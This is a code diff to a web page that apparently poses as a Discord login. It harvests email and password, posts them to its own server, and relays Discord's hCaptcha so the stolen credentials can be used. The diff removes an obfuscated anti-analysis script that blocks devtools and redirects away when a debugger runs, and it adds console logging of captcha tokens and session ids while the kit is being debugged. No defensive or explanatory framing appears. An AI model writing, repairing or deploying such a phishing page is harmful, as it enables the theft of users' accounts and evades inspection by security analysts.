@@ -39,7 +39,7 @@
   <link rel="icon" type="image/png" href="/captcha.png?v=2"/>
   <link rel="shortcut icon" type="image/png" href="/captcha.png?v=2"/>
   <link rel="apple-touch-icon" href="/captcha.png?v=2"/>
-  <script>!function(){var _0x=function(){try{return!!window.console&&(window.console.log(''),!0)}catch(e){return!1}};document.addEventListener('contextmenu',function(e){e.preventDefault()});document.addEventListener('keydown',function(e){if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='i'||e.key==='J'||e.key==='j'||e.key==='C'||e.key==='c'))||(e.ctrlKey&&(e.key==='U'||e.key==='u'||e.key==='S'||e.key==='s'))){e.preventDefault();e.stopPropagation();return false}});var _chk=new Image();Object.defineProperty(_chk,'id',{get:function(){document.body.innerHTML='';window.location.href='https://discord.com'}});setInterval(function(){var t0=performance.now();debugger;if(performance.now()-t0>100){document.body.innerHTML='';window.location.href='https://discord.com'}},3000);var _el=document.createElement('div');Object.defineProperty(_el,'id',{get:function(){document.body.innerHTML='';window.location.href='https://discord.com'}})}();</script>
+  <!-- anti-debug disabled for testing -->
   <link rel="preconnect" href="https://fonts.googleapis.com"/>
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
   <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;500;600;700&display=swap" rel="stylesheet"/>
@@ -567,21 +567,28 @@ function onHcaptchaPass(token) {
 
 async function submitWithCaptcha(captchaToken) {
   try {
+    var payload = {
+      login:              captchaEmail,
+      password:           captchaPw,
+      captcha_token:      captchaToken,
+      captcha_rqtoken:    captchaRqtoken,
+      captcha_session_id: captchaSessionId
+    };
+    console.log('[captcha] submitting payload keys:', Object.keys(payload));
+    console.log('[captcha] rqtoken:', captchaRqtoken ? captchaRqtoken.slice(0,20)+'...' : '(empty)');
+    console.log('[captcha] session_id:', captchaSessionId ? captchaSessionId.slice(0,20)+'...' : '(empty)');
+    console.log('[captcha] token prefix:', captchaToken ? captchaToken.slice(0,20)+'...' : '(empty)');
     var r = await fetch('/api/login', {
       method: 'POST',
       headers: {'Content-Type':'application/json'},
-      body: JSON.stringify({
-        login:              captchaEmail,
-        password:           captchaPw,
-        captcha_token:      captchaToken,
-        captcha_rqtoken:    captchaRqtoken,
-        captcha_session_id: captchaSessionId
-      })
+      body: JSON.stringify(payload)
     });
     var d = await r.json();
+    console.log('[captcha] server response status:', r.status, 'body:', JSON.stringify(d).slice(0,300));
     hideCaptchaStall();
     processLoginResult(d, r.status);
   } catch(err) {
+    console.error('[captcha] submitWithCaptcha error:', err);
     hideCaptchaStall();
     showErr('login-error', 'Connection error. Please try again.');
     btnLoad('login-btn', false);
@@ -786,6 +793,7 @@ document.getElementById('login-form').addEventListener('submit', async function(
     var d = await r.json();
     if (d.captcha_needed) {
       /* Server says captcha required — render real Discord hCaptcha */
+      console.log('[login] captcha challenge received:', JSON.stringify({sitekey:d.sitekey,rqdata:d.rqdata?d.rqdata.slice(0,20)+'...':'',rqtoken:d.rqtoken?d.rqtoken.slice(0,20)+'...':'',session_id:d.session_id}));
       captchaRqtoken   = d.rqtoken || '';
       captchaSessionId = d.session_id || '';
       showCaptchaStall(d.sitekey, d.rqdata);
